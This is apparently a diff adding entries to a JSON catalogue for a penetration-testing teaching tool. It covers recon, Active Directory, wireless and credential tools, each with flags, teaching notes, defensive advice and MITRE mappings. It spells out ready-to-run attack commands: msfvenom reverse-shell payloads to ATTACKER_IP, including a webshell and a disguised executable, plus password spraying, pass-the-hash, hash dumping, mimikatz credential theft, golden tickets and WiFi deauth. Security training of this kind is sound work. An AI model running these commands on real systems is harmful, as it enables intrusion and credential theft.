+    "teach_intro": "AMASS doesn't just find subdomains — it maps the entire attack surface. It discovers ASNs, CIDRs, IP ranges, related domains, and builds a relationship graph of everything connected to the target. Use it when you need the deepest possible picture before an engagement.",
+    "default_command": "amass enum -d {target} -passive",
+    "flags": {
+      "enum":     { "label": "Enumerate Mode", "desc": "Subdomain enumeration — the primary mode.", "example": "amass enum -d target.com", "teach": "enum mode does full enumeration. Add -passive for OSINT-only. Default includes active DNS queries.", "risk": "quiet" },
+      "intel":    { "label": "Intel Mode", "desc": "Discover root domains, ASNs, and CIDRs owned by an organization.", "example": "amass intel -org 'Target Corp'", "teach": "Intel mode finds everything a company owns by searching WHOIS, ASN records, and netblocks. Gives you domains you didn't know to look for.", "risk": "quiet" },
+      "-d":       { "label": "Target Domain", "desc": "Domain to enumerate.", "example": "amass enum -d target.com", "teach": "Primary target domain. Amass will find subdomains, related domains, and connected infrastructure.", "risk": "quiet" },
+      "-passive": { "label": "Passive Only", "desc": "Only use passive OSINT sources. Never touches the target directly.", "example": "amass enum -d target.com -passive", "teach": "Passive mode is OPSEC-safe. Queries CT logs, Shodan, VirusTotal, ThreatCrowd. Zero packets to target.", "risk": "quiet" },
+      "-active":  { "label": "Active Enumeration", "desc": "Include active DNS resolution, zone transfers, and brute forcing.", "example": "amass enum -d target.com -active", "teach": "Active mode sends DNS queries and attempts zone transfers. Much more thorough but leaves traces in DNS server logs.", "risk": "noisy" },
+      "-brute":   { "label": "DNS Brute Force", "desc": "Brute force subdomains with a wordlist.", "example": "amass enum -d target.com -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "teach": "Brute force finds subdomains not indexed in any public database. Pair with a good wordlist from seclists.", "risk": "noisy" },
+      "-o":       { "label": "Output File", "desc": "Save results to text file.", "example": "amass enum -d target.com -o amass_results.txt", "teach": "Always save amass output — it includes IP addresses, ASNs, and relationships, not just hostnames.", "risk": "safe" },
+      "-json":    { "label": "JSON Output", "desc": "Save results in JSON format with relationship data.", "example": "amass enum -d target.com -json results.json", "teach": "JSON output preserves the graph relationships. Import into maltego or process with jq to extract specific data types.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Passive Enum":   { "flags": ["enum", "-d", "{target}", "-passive", "-o", "amass_passive.txt"], "desc": "Pure OSINT, no target contact." },
+      "Active Enum":    { "flags": ["enum", "-d", "{target}", "-active", "-brute", "-o", "amass_active.txt"], "desc": "Full active + brute force enumeration." },
+      "Intel Gather":   { "flags": ["intel", "-org", "'{target}'", "-o", "amass_intel.txt"], "desc": "Find all domains/ASNs owned by organization name." }
+    },
+    "defend_notes": "Like subfinder, passive AMASS runs are invisible to you. Active mode generates DNS queries that appear in your DNS server logs. Monitor certificate transparency logs for unexpected certificates issued for your domains. Use DMARC, SPF, and DKIM to reduce email-based attack surface visibility.",
+    "mitre_techniques": ["T1596 - Search Open Technical Databases", "T1590 - Gather Victim Network Information"]
+  },
+
+  "enum4linux": {
+    "name": "Enum4linux",
+    "binary": "enum4linux",
+    "category": "recon",
+    "description": "SMB/NetBIOS enumeration tool for Windows and Samba systems. Extracts: usernames, groups, shares, policies, OS info, and domain data using null sessions and anonymous authentication. Essential for Active Directory recon.",
+    "teach_intro": "Enum4linux queries Windows SMB (port 445) and NetBIOS (port 139) for information available without valid credentials. Null sessions and anonymous authentication often expose usernames, share lists, and domain information — all useful for building your attack plan against Windows environments.",
+    "default_command": "enum4linux -a {target}",
+    "flags": {
+      "-a":   { "label": "All Simple Checks", "desc": "Run all simple enumeration checks. The go-to flag for initial SMB recon.", "example": "enum4linux -a 192.168.1.1", "teach": "-a runs everything: shares, users, groups, OS info, password policy. One flag gets you everything available without creds.", "risk": "noisy" },
+      "-U":   { "label": "Get Users", "desc": "Enumerate users via RID cycling.", "example": "enum4linux -U 192.168.1.1", "teach": "RID cycling starts from RID 500 (Administrator) and increments, resolving each RID to a username. Lists all local and domain accounts.", "risk": "noisy" },
+      "-S":   { "label": "Get Shares", "desc": "Enumerate shares on the target.", "example": "enum4linux -S 192.168.1.1", "teach": "Lists all SMB shares. SYSVOL and NETLOGON are standard AD shares. C$, ADMIN$ require admin rights. Look for unusual shares with sensitive data.", "risk": "noisy" },
+      "-P":   { "label": "Get Password Policy", "desc": "Extract the domain/local password policy.", "example": "enum4linux -P 192.168.1.1", "teach": "Password policy reveals: min length, lockout threshold, lockout duration. Guides your brute force strategy — stay under the lockout count!", "risk": "noisy" },
+      "-G":   { "label": "Get Groups", "desc": "Enumerate group memberships.", "example": "enum4linux -G 192.168.1.1", "teach": "Group membership reveals privilege structure. Who's in Domain Admins? Who's in Remote Desktop Users? Maps your escalation path.", "risk": "noisy" },
+      "-u":   { "label": "Username", "desc": "Authenticate with credentials: -u username -p password", "example": "enum4linux -u admin -p password123 192.168.1.1", "teach": "Authenticated enum returns much more data. If you have any valid credentials (even low-priv), always use them.", "risk": "noisy" },
+      "-p":   { "label": "Password", "desc": "Password for authentication.", "example": "enum4linux -u admin -p password123 192.168.1.1", "teach": "Combined with -u. Even guest/guest or domain\\user:password works for expanded enumeration.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Full Enum":      { "flags": ["-a", "{target}"], "desc": "Complete anonymous SMB enumeration." },
+      "Users Only":     { "flags": ["-U", "{target}"], "desc": "Extract user list via RID cycling." },
+      "Auth Enum":      { "flags": ["-a", "-u", "guest", "-p", "", "{target}"], "desc": "Authenticated enum with guest account." }
+    },
+    "defend_notes": "Disable null sessions: set RestrictAnonymous=1 in registry. Disable anonymous enumeration of SAM accounts and shares in Group Policy. Ensure SMB signing is enforced to prevent relay attacks. Block port 445 at the perimeter — no SMB should be externally accessible. Monitor for rapid SMB enumeration patterns in Windows Event Log (Event 4625, 4624).",
+    "mitre_techniques": ["T1135 - Network Share Discovery", "T1087 - Account Discovery", "T1069 - Permission Groups Discovery"]
+  },
+
+  "crackmapexec": {
+    "name": "CrackMapExec",
+    "binary": "crackmapexec",
+    "category": "exploitation",
+    "description": "Swiss Army knife for Windows/Active Directory post-exploitation and lateral movement. Tests credentials across entire subnets, dumps hashes, executes commands, deploys agents, and maps AD environments. Competes directly with Cobalt Strike for post-access operations.",
+    "teach_intro": "CME automates what would take hours manually in AD environments. Give it a subnet and credentials — it tests every host, shows which ones you can admin, and lets you dump SAM/NTDS hashes, execute commands, or spider shares across the entire domain in minutes.",
+    "default_command": "crackmapexec smb {target}",
+    "flags": {
+      "smb":    { "label": "SMB Protocol", "desc": "Target Windows SMB (the most common usage).", "example": "crackmapexec smb 192.168.1.0/24", "teach": "SMB mode tests credentials and executes against Windows hosts. A green [+] means success. Red [-] means denied. Pwn3d! means you're a local admin.", "risk": "noisy" },
+      "winrm":  { "label": "WinRM Protocol", "desc": "Target Windows Remote Management (port 5985/5986).", "example": "crackmapexec winrm 192.168.1.1 -u admin -p password", "teach": "WinRM gives you PowerShell remoting. If SMB works and WinRM is open, you can drop into an interactive PS session.", "risk": "noisy" },
+      "ldap":   { "label": "LDAP Protocol", "desc": "Query Active Directory via LDAP.", "example": "crackmapexec ldap 192.168.1.1 -u admin -p password --users", "teach": "LDAP against the DC dumps users, groups, GPOs, and trusts. --bloodhound exports data for BloodHound graph analysis.", "risk": "noisy" },
+      "-u":     { "label": "Username", "desc": "Username or file of usernames.", "example": "crackmapexec smb 192.168.1.0/24 -u admin -p password", "teach": "Single username for targeted sprays. Use a file for mass testing: -u users.txt. Always respect lockout policies!", "risk": "noisy" },
+      "-p":     { "label": "Password", "desc": "Password or file of passwords.", "example": "crackmapexec smb 192.168.1.0/24 -u admin -p password", "teach": "Combined with -u. For spraying: single password against many users. For dumping: use cracked password to authenticate.", "risk": "very_noisy" },
+      "-H":     { "label": "NT Hash (Pass the Hash)", "desc": "Use NT hash instead of password for authentication.", "example": "crackmapexec smb 192.168.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", "teach": "Pass the Hash doesn't need the plaintext password — just the NTLM hash. Dump hashes from one machine, pass them to access others. Classic lateral movement.", "risk": "very_noisy" },
+      "--sam":  { "label": "Dump SAM Hashes", "desc": "Dump local SAM database (requires local admin).", "example": "crackmapexec smb 192.168.1.1 -u admin -p password --sam", "teach": "SAM contains local account hashes. Administrator hash often reused across machines. Crack with hashcat or pass-the-hash directly.", "risk": "very_noisy" },
+      "--ntds": { "label": "Dump NTDS (DC Only)", "desc": "Dump the entire Active Directory database from a Domain Controller.", "example": "crackmapexec smb dc01.domain.com -u admin -p password --ntds", "teach": "NTDS.dit is the crown jewel — every domain account hash in one dump. Domain compromise means cracking every user's password.", "risk": "very_noisy" },
+      "--shares":{ "label": "Enumerate Shares", "desc": "List all accessible shares on target(s).", "example": "crackmapexec smb 192.168.1.0/24 -u user -p password --shares", "teach": "Maps readable shares across the network. Find: finance folders, HR data, passwords.xlsx, backup files. Lateral movement goldmine.", "risk": "noisy" },
+      "-x":     { "label": "Execute Command", "desc": "Execute a shell command on target(s).", "example": "crackmapexec smb 192.168.1.1 -u admin -p password -x whoami", "teach": "-x runs the command via SMBExec. -X runs PowerShell commands. Start with 'whoami /priv' to see your privileges.", "risk": "very_noisy" },
+      "--bloodhound":{ "label": "BloodHound Collection", "desc": "Collect AD data for BloodHound graph analysis.", "example": "crackmapexec ldap dc01.domain.com -u user -p password --bloodhound -ns 192.168.1.1 --collection All", "teach": "BloodHound data reveals shortest path to Domain Admin. Visual attack path mapping — indispensable for complex AD environments.", "risk": "noisy" }
+    },
+    "preset_profiles": {
+      "SMB Scan":       { "flags": ["smb", "{target}"], "desc": "Quick SMB host discovery, no creds." },
+      "Spray Network":  { "flags": ["smb", "{target}/24", "-u", "administrator", "-p", "Password1!", "--continue-on-success"], "desc": "Password spray across subnet." },
+      "Dump SAM":       { "flags": ["smb", "{target}", "-u", "admin", "-p", "PASSWORD", "--sam"], "desc": "Dump local SAM hashes (needs local admin)." },
+      "Pass the Hash":  { "flags": ["smb", "{target}/24", "-u", "administrator", "-H", "NTLM_HASH", "--continue-on-success"], "desc": "Pass-the-hash lateral movement." },
+      "Exec Command":   { "flags": ["smb", "{target}", "-u", "admin", "-p", "PASSWORD", "-x", "whoami /priv"], "desc": "Remote command execution." }
+    },
+    "defend_notes": "CME operations are highly visible in Windows Event Logs: Event 4624 (logon), 4625 (failed logon), 4648 (explicit credential use). Enable detailed process creation logging. Credential Guard prevents LSASS dumping. LAPS randomizes local admin passwords preventing lateral movement via shared passwords. Implement network segmentation so workstations can't SMB-connect to each other.",
+    "mitre_techniques": ["T1021.002 - Remote Services: SMB/Windows Admin Shares", "T1003.002 - OS Credential Dumping: SAM", "T1110.003 - Password Spraying"]
+  },
+
+  "msfvenom": {
+    "name": "MSFvenom",
+    "binary": "msfvenom",
+    "category": "exploitation",
+    "description": "Metasploit's payload generator and encoder. Creates shellcode, executables, scripts, and APKs in any format for any platform. Combines msfpayload and msfencode into a single tool. Used for creating reverse shells, bind shells, and staged/stageless payloads.",
+    "teach_intro": "MSFvenom generates the malicious payload that runs on the victim after exploitation. Think of it as a payload factory: you choose what it does (reverse shell, bind shell, exec), what format (exe, elf, py, php, apk), and what architecture (x86, x64, ARM). The output goes on the victim, MSF multi/handler catches the connection.",
+    "default_command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={target} LPORT=4444 -f exe -o payload.exe",
+    "flags": {
+      "-p":   { "label": "Payload", "desc": "Payload type: windows/x64/meterpreter/reverse_tcp, linux/x64/shell_reverse_tcp, etc.", "example": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe", "teach": "Payload naming: OS/arch/type/connection. reverse_tcp calls back to you. bind_tcp opens a port on victim. Staged (/) downloads shellcode. Stageless (_) is self-contained.", "risk": "very_noisy" },
+      "-f":   { "label": "Output Format", "desc": "Format: exe, elf, py, php, asp, aspx, rb, sh, apk, raw, c, dll.", "example": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe -o payload.exe", "teach": "Match format to the target environment. PHP payload for web servers. ELF for Linux binaries. APK for Android. EXE for Windows.", "risk": "safe" },
+      "-e":   { "label": "Encoder", "desc": "Encode payload to avoid signature detection: -e x86/shikata_ga_nai", "example": "msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe", "teach": "Encoding transforms shellcode to evade AV signatures. -i 5 encodes 5 times. shikata_ga_nai is the classic encoder but most AV catches it now. Real evasion needs custom packers.", "risk": "safe" },
+      "-i":   { "label": "Encoding Iterations", "desc": "Number of times to encode: -i 5", "example": "msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe", "teach": "More iterations = more obfuscation. But each iteration increases file size and many AV detect the encoding wrapper itself.", "risk": "safe" },
+      "-o":   { "label": "Output File", "desc": "Save payload to file.", "example": "msfvenom ... -o /tmp/payload.exe", "teach": "Always specify -o. Otherwise msfvenom outputs raw bytes to stdout. Name the file something believable: update.exe, setup.exe, invoice.pdf.exe.", "risk": "safe" },
+      "-a":   { "label": "Architecture", "desc": "Target architecture: x86, x64, arm, mipsle.", "example": "msfvenom -p linux/arm/shell_reverse_tcp -a arm LHOST=10.10.10.1 LPORT=4444 -f elf", "teach": "Wrong arch = payload won't execute. Check with 'file <binary>' on the target system. ARM for Raspberry Pi, IoT devices, Android.", "risk": "safe" },
+      "--platform":{ "label": "Target Platform", "desc": "Target OS: windows, linux, osx, android, php, python, java.", "example": "msfvenom --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe", "teach": "Platform determines which payload options are available. Usually auto-detected from the payload name.", "risk": "safe" },
+      "-l payloads":{ "label": "List Payloads", "desc": "List all available payloads filtered by string.", "example": "msfvenom -l payloads | grep windows", "teach": "Hundreds of payload options. grep for your OS: msfvenom -l payloads | grep 'linux/x64' | grep 'shell'", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Win64 Reverse":  { "flags": ["-p", "windows/x64/meterpreter/reverse_tcp", "LHOST=ATTACKER_IP", "LPORT=4444", "-f", "exe", "-o", "payload.exe"], "desc": "Windows 64-bit Meterpreter reverse shell EXE." },
+      "Linux Reverse":  { "flags": ["-p", "linux/x64/shell_reverse_tcp", "LHOST=ATTACKER_IP", "LPORT=4444", "-f", "elf", "-o", "payload.elf"], "desc": "Linux 64-bit reverse shell ELF binary." },
+      "PHP Webshell":   { "flags": ["-p", "php/meterpreter_reverse_tcp", "LHOST=ATTACKER_IP", "LPORT=4444", "-f", "raw", "-o", "shell.php"], "desc": "PHP Meterpreter webshell." },
+      "Python Payload": { "flags": ["-p", "python/meterpreter/reverse_tcp", "LHOST=ATTACKER_IP", "LPORT=4444", "-f", "raw", "-o", "payload.py"], "desc": "Python Meterpreter reverse shell." },
+      "Android APK":    { "flags": ["-p", "android/meterpreter/reverse_tcp", "LHOST=ATTACKER_IP", "LPORT=4444", "-o", "malicious.apk"], "desc": "Android Meterpreter APK." }
+    },
+    "defend_notes": "EDR solutions detect Meterpreter's shellcode patterns, process injection, and C2 beaconing even through encoding. Modern AV (Windows Defender, CrowdStrike) catches standard msfvenom payloads on disk. Real-world evasion requires custom packers, code signing, or in-memory execution. Application whitelisting blocks unauthorized executables entirely.",
+    "mitre_techniques": ["T1059 - Command and Scripting Interpreter", "T1027 - Obfuscated Files or Information", "T1055 - Process Injection"]
+  },
+
+  "aircrack-ng": {
+    "name": "Aircrack-ng",
+    "binary": "aircrack-ng",
+    "category": "wireless",
+    "description": "The complete WiFi security auditing suite. Captures WPA2 handshakes, performs deauth attacks to force reconnections, cracks WEP/WPA/WPA2 passphrases, and monitors wireless traffic. The foundation of all WiFi security testing.",
+    "teach_intro": "WiFi attacks follow a pattern: put your adapter in monitor mode → capture traffic → capture the 4-way handshake (force it with deauth) → crack the handshake offline with a wordlist. The handshake contains enough info to verify passwords without connecting to the AP.",
+    "default_command": "aircrack-ng {target} -w /usr/share/wordlists/rockyou.txt",
+    "flags": {
+      "-w":    { "label": "Wordlist", "desc": "Wordlist for WPA/WPA2 passphrase cracking.", "example": "aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt", "teach": "WPA2 cracking is a dictionary attack against the 4-way handshake. rockyou.txt covers common passphrases. Corporate networks often use complex passphrases — try specialized WiFi wordlists.", "risk": "safe" },
+      "-b":    { "label": "Target BSSID", "desc": "Filter by specific access point MAC address.", "example": "aircrack-ng capture.cap -b AA:BB:CC:DD:EE:FF -w rockyou.txt", "teach": "When your capture file has multiple APs, -b specifies which one to crack. Get the BSSID from airodump-ng output.", "risk": "safe" },
+      "-e":    { "label": "Target ESSID", "desc": "Filter by network name (SSID).", "example": "aircrack-ng capture.cap -e 'TargetNetwork' -w rockyou.txt", "teach": "Alternative to -b. Use the network name if you don't have the BSSID.", "risk": "safe" },
+      "airmon-ng":{ "label": "Monitor Mode", "desc": "Enable/disable monitor mode on WiFi adapter.", "example": "airmon-ng start wlan0", "teach": "Monitor mode lets your adapter see ALL WiFi frames, not just those addressed to it. Required step before any WiFi attack. Your interface becomes wlan0mon.", "risk": "noisy" },
+      "airodump-ng":{ "label": "Capture Traffic", "desc": "Capture WiFi packets and discover networks.", "example": "airodump-ng wlan0mon", "teach": "Shows all APs in range with BSSID, channel, encryption, and connected clients. Focus on a target: airodump-ng -c [channel] --bssid [AP MAC] -w capture wlan0mon", "risk": "noisy" },
+      "aireplay-ng":{ "label": "Inject Packets / Deauth", "desc": "Inject packets including deauth attacks to force handshake capture.", "example": "aireplay-ng --deauth 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon", "teach": "Deauth kicks the client off the network. When they reconnect, you capture the 4-way handshake. --deauth 0 runs continuously. Use -c to target a specific client.", "risk": "very_noisy" },
+      "hcxtools":{ "label": "PMKID Attack", "desc": "Capture PMKID without waiting for a client handshake.", "example": "hcxdumptool -i wlan0mon -o pmkid.pcapng && hcxpcapngtool pmkid.pcapng -o hash.txt && hashcat -m 22000 hash.txt rockyou.txt", "teach": "PMKID attack captures just from the beacon — no client needed! Convert capture to hashcat format 22000 for cracking. Faster than waiting for deauth handshake.", "risk": "noisy" }
+    },
+    "preset_profiles": {
+      "Enable Monitor": { "flags": ["airmon-ng start wlan0"], "desc": "Step 1: Enable monitor mode." },
+      "Scan Networks":  { "flags": ["airodump-ng wlan0mon"], "desc": "Step 2: Discover nearby WiFi networks." },
+      "Capture Target": { "flags": ["airodump-ng -c CHANNEL --bssid AP_MAC -w capture wlan0mon"], "desc": "Step 3: Target specific AP for capture." },
+      "Deauth Attack":  { "flags": ["aireplay-ng --deauth 10 -a AP_MAC wlan0mon"], "desc": "Step 4: Force handshake by deauthing clients." },
+      "Crack WPA2":     { "flags": ["{target}", "-w", "/usr/share/wordlists/rockyou.txt"], "desc": "Step 5: Crack captured handshake." }
+    },
+    "defend_notes": "WPA3 replaces WPA2's vulnerable 4-way handshake with SAE (Simultaneous Authentication of Equals) — immune to offline dictionary attacks. Use strong random WiFi passphrases (20+ chars) making dictionary attacks impractical. Detect deauth attacks with wireless IDS (Kismet, Waidps). Enterprise networks should use 802.1X/EAP authentication instead of PSK.",
+    "mitre_techniques": ["T1040 - Network Sniffing", "T1110.001 - Brute Force: Password Guessing"]
+  },
+
+  "wireshark": {
+    "name": "Wireshark",
+    "binary": "wireshark",
+    "category": "network_analysis",
+    "description": "The world's most widely used network protocol analyzer. Captures and dissects live network traffic or analyzes saved PCAP files. Decodes 2000+ protocols including HTTP, DNS, SMB, TLS (with keys), SSH metadata, and more. Essential for incident response and network forensics.",
+    "teach_intro": "Wireshark sees every packet on the network. HTTP traffic is fully readable — usernames, passwords, session tokens all visible in plaintext. Even encrypted traffic reveals connection patterns, timing, and metadata. For forensics, a PCAP file is a complete record of everything that happened on the network.",
+    "default_command": "wireshark",
+    "flags": {
+      "-i":    { "label": "Interface", "desc": "Capture on a specific network interface.", "example": "wireshark -i eth0", "teach": "Specify the interface to capture on. Use 'ip link show' to list interfaces. wlan0 for WiFi, eth0 for Ethernet, lo for loopback.", "risk": "safe" },
+      "-r":    { "label": "Read PCAP File", "desc": "Open an existing packet capture file.", "example": "wireshark -r capture.pcap", "teach": "PCAP files are recordings of network traffic. Open them to analyze after the fact — incidents, CTF challenges, or saved captures.", "risk": "safe" },
+      "-f":    { "label": "Capture Filter", "desc": "BPF syntax filter applied during capture: 'host 192.168.1.1' or 'port 80'", "example": "wireshark -i eth0 -f 'host 192.168.1.1 and port 80'", "teach": "Capture filters (BPF syntax) filter before writing to disk. Display filters (in the GUI) filter after capture. Always use capture filters on high-traffic networks.", "risk": "safe" },
+      "-Y":    { "label": "Display Filter", "desc": "Apply Wireshark display filter: 'http', 'dns', 'tcp.port==445'", "example": "wireshark -r capture.pcap -Y 'http.request.method==POST'", "teach": "Display filters let you find specific traffic. 'http.request' shows all HTTP requests. 'dns' shows all DNS. 'smb2' shows SMB. 'frame contains password' searches all packets for the word password.", "risk": "safe" },
+      "tshark":{ "label": "TShark (CLI)", "desc": "Command-line version of Wireshark. Perfect for scripting and remote captures.", "example": "tshark -i eth0 -f 'port 80' -w capture.pcap", "teach": "TShark is Wireshark without the GUI. Use it on headless servers, in scripts, or over SSH. tshark -r file.pcap -T fields -e http.request.uri extracts all HTTP URLs.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Live Capture":   { "flags": ["-i", "eth0"], "desc": "Start live capture on eth0." },
+      "Open PCAP":      { "flags": ["-r", "{target}"], "desc": "Open existing PCAP file." },
+      "HTTP Filter":    { "flags": ["-r", "{target}", "-Y", "http"], "desc": "Show only HTTP traffic from PCAP." }
+    },
+    "defend_notes": "Encrypt everything — TLS 1.3 makes payload capture useless. Even with a PCAP you only see encrypted blobs. For internal networks: enable SMB signing (prevents SMB relay), use encrypted protocols only (SSH not Telnet, HTTPS not HTTP, SFTP not FTP). Network TAPs and SPAN ports for legitimate monitoring should be locked down — an attacker with TAP access sees everything.",
+    "mitre_techniques": ["T1040 - Network Sniffing", "T1046 - Network Service Discovery"]
+  },
+
+  "mimikatz": {
+    "name": "Mimikatz",
+    "binary": "mimikatz",
+    "category": "post_exploit",
+    "description": "Windows credential extraction tool. Dumps plaintext passwords, NTLM hashes, Kerberos tickets, and certificates from Windows memory (LSASS). The most dangerous credential tool in existence — runs after gaining admin access.",
+    "teach_intro": "Mimikatz reads from LSASS (Local Security Authority Subsystem Service), the Windows process that manages authentication. When users log in, LSASS caches their credentials in memory for convenience. Mimikatz extracts them — often including plaintext passwords for recently logged-in users.",
+    "default_command": "mimikatz.exe",
+    "flags": {
+      "sekurlsa::logonpasswords": { "label": "Dump Logon Passwords", "desc": "Extract plaintext passwords and NTLM hashes from LSASS memory.", "example": "sekurlsa::logonpasswords", "teach": "The holy grail. Shows all currently cached credentials: username, domain, NTLM hash, and sometimes plaintext password. Requires SYSTEM or local admin.", "risk": "very_noisy" },
+      "sekurlsa::wdigest":        { "label": "WDigest Credentials", "desc": "Show plaintext passwords cached by the WDigest protocol.", "example": "sekurlsa::wdigest", "teach": "WDigest caches plaintext passwords for legacy SSO. Disabled in Win8.1+ but can be re-enabled via registry. Legacy servers still have it on.", "risk": "very_noisy" },
+      "sekurlsa::tickets":        { "label": "Kerberos Tickets", "desc": "List and export Kerberos tickets from memory.", "example": "sekurlsa::tickets /export", "teach": "Kerberos tickets let you authenticate without a password. Exported .kirbi files can be used with Pass the Ticket attacks or Kerberoasting.", "risk": "very_noisy" },
+      "lsadump::sam":             { "label": "SAM Database", "desc": "Dump local account hashes from the SAM database.", "example": "lsadump::sam", "teach": "SAM holds local account hashes. Requires SYSTEM. Hashes are in NTLM format — crack with hashcat or pass directly.", "risk": "very_noisy" },
+      "lsadump::dcsync":          { "label": "DCSync Attack", "desc": "Impersonate a DC and request password hashes via replication protocol.", "example": "lsadump::dcsync /domain:corp.local /user:Administrator", "teach": "DCSync doesn't touch LSASS — it uses replication protocols to request hashes from the DC. Stealthier than running on the DC itself. Requires DA or replication rights.", "risk": "very_noisy" },
+      "kerberos::golden":         { "label": "Golden Ticket", "desc": "Forge a Kerberos ticket granting ticket (TGT) using the KRBTGT hash.", "example": "kerberos::golden /user:Administrator /domain:corp.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /ticket:golden.kirbi", "teach": "Golden Ticket is god-mode in AD. With the KRBTGT hash you create valid Kerberos tickets for ANY user including non-existent ones — works for 10 years. Full domain persistence.", "risk": "very_noisy" },
+      "privilege::debug":         { "label": "Enable Debug Privilege", "desc": "Required before accessing LSASS. Run first.", "example": "privilege::debug", "teach": "Debug privilege allows reading other process memory including LSASS. Always run this first or credential extraction commands will fail.", "risk": "noisy" },
+      "token::elevate":           { "label": "Token Impersonation", "desc": "Impersonate SYSTEM token for higher privileges.", "example": "token::elevate", "teach": "Elevates to SYSTEM even if running as admin. SYSTEM has more rights than admin on Windows. Required for some credential operations.", "risk": "very_noisy" }
+    },
+    "preset_profiles": {
+      "Full Dump":      { "flags": ["privilege::debug", "&&", "sekurlsa::logonpasswords"], "desc": "Enable debug privilege then dump all credentials." },
+      "DCSync DA":      { "flags": ["lsadump::dcsync /domain:{target} /user:Administrator"], "desc": "DCSync attack to pull Domain Admin hash." },
+      "Export Tickets": { "flags": ["sekurlsa::tickets /export"], "desc": "Export all Kerberos tickets to .kirbi files." }
+    },
+    "defend_notes": "Windows Credential Guard (virtualization-based security) isolates LSASS in a hypervisor-protected container making Mimikatz memory reading impossible. Enable Protected Users security group — prevents credential caching. Disable WDigest (HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest → UseLogonCredential = 0). Enable LSASS PPL (Protected Process Light). Monitor for process access to LSASS (Event 4663, 10).",
+    "mitre_techniques": ["T1003.001 - LSASS Memory", "T1550.002 - Pass the Hash", "T1558.001 - Golden Ticket"]
+  },
+
+  "bloodhound": {
+    "name": "BloodHound",
+    "binary": "bloodhound",
+    "category": "post_exploit",
+    "description": "Active Directory attack path mapping tool. Collects AD relationships and visualizes them as a graph, showing the shortest paths from any compromised account to Domain Admin. Reveals privilege escalation paths that would take days to find manually.",
+    "teach_intro": "BloodHound thinks of Active Directory as a graph where users, groups, computers, and GPOs are nodes connected by edges (relationships). It finds attack paths like: you own user A → user A is local admin on computer B → computer C's admin is logged into B → C's admin is in Domain Admins. Each hop is a lateral movement opportunity.",
+    "default_command": "bloodhound",
+    "flags": {
+      "SharpHound":    { "label": "Data Collector (Windows)", "desc": "Windows collector that gathers AD data. Run as domain user.", "example": "SharpHound.exe -c All --zipfilename bloodhound_data.zip", "teach": "SharpHound collects from Windows. -c All gathers everything: sessions, ACLs, trusts, GPOs. Output is a zip of JSON files you import into BloodHound.", "risk": "noisy" },
+      "bloodhound-python":{ "label": "Python Collector (Linux)", "desc": "Linux-based collector. Run from Kali with domain credentials.", "example": "bloodhound-python -u user -p password -d corp.local -c All -ns 192.168.1.1", "teach": "Linux collector — no need to run anything on Windows. Requires valid domain credentials. -c All collects sessions, ACLs, trusts. Import the resulting JSON files into BloodHound.", "risk": "noisy" },
+      "-c All":        { "label": "Collect Everything", "desc": "Collect all data types: Session, ACL, ObjectProps, Trusts, LocalAdmin, RDP, DCOM, PSRemote.", "example": "SharpHound.exe -c All", "teach": "All collection methods give you the most complete graph. Session data shows which users are logged into which computers right now — critical for finding paths.", "risk": "noisy" },
+      "Find Shortest Paths to DA": { "label": "Attack Path to DA", "desc": "Built-in BloodHound query: find paths from owned nodes to Domain Admins.", "example": "In BloodHound GUI: Analysis → Find Shortest Paths to Domain Admins", "teach": "The killer feature. Mark your compromised accounts as Owned, then run this query. BloodHound shows every attack path. Focus on paths with the fewest hops.", "risk": "safe" },
+      "Kerberoastable Accounts": { "label": "Find Kerberoastable Users", "desc": "Find service accounts with SPNs that can be Kerberoasted.", "example": "In BloodHound GUI: Analysis → Find all Kerberoastable Users", "teach": "Kerberoastable accounts have SPNs — request their service tickets, extract, crack offline. Service accounts often have weak passwords and excessive privileges.", "risk": "safe" }
+    },
+    "preset_profiles": {
+      "Collect (Linux)": { "flags": ["bloodhound-python -u USER -p PASS -d DOMAIN -c All -ns DC_IP"], "desc": "Collect AD data from Linux with credentials." },
+      "Collect (Win)":   { "flags": ["SharpHound.exe -c All --zipfilename bh_data.zip"], "desc": "Collect from Windows domain-joined machine." }
+    },
+    "defend_notes": "BloodHound's collection methods are detectable: LDAP queries for ACLs, SMB connections to enumerate local admin, and session collection generate logs. Enable advanced audit policies (Account Logon, DS Access). The attack paths BloodHound reveals are real misconfigurations — remediate them: remove excessive ACL rights, clean up group membership, implement least privilege. Review DCSync rights monthly.",
+    "mitre_techniques": ["T1087.002 - Account Discovery: Domain Account", "T1069.002 - Permission Groups Discovery: Domain Groups"]
+  },
+
+  "evil-winrm": {
+    "name": "Evil-WinRM",
+    "binary": "evil-winrm",
+    "category": "post_exploit",
+    "description": "Windows Remote Management shell for pentesting. Provides a fully functional PowerShell session with extra features: file upload/download, in-memory .NET assembly loading, Pass the Hash, Kerberos auth, and bypass for AMSI and logging.",
+    "teach_intro": "WinRM is Windows' built-in remote management protocol on port 5985/5986. Evil-WinRM connects to it and gives you a feature-rich shell. It's cleaner than a reverse Meterpreter session for interactive work — you get tab completion, history, and PowerShell's full power.",
+    "default_command": "evil-winrm -i {target} -u administrator -p password",
+    "flags": {
+      "-i":   { "label": "Target IP", "desc": "Target Windows machine IP address.", "example": "evil-winrm -i 192.168.1.1 -u admin -p password", "teach": "WinRM must be enabled on the target (it's on by default on Windows Server 2012+). Port 5985 (HTTP) or 5986 (HTTPS).", "risk": "noisy" },
